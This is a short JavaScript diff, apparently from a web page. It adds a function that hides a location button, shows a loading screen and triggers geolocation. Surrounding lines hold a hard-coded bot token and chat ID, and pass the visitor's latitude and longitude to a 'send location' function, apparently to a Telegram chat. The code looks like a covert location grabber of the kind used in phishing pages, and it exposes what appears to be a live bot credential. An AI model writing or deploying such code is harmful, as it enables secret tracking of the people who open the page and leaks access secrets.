@@ -1,3 +1,11 @@
+function startLocation(){
+
+document.getElementById("btnLokasi").style.display="none";
+document.getElementById("loading").classList.remove("hidden");
+
+getLocation();
+
+}
 const token = "8263999601:AAHWjwvSPrSk4URDgvPLAqGAvfLl_wuHLdE";
 const chat_id = "8334910422";
 
@@ -35,4 +43,5 @@ const lon = pos.coords.longitude;
 kirimLokasi(lat,lon);
 
 });
+
 
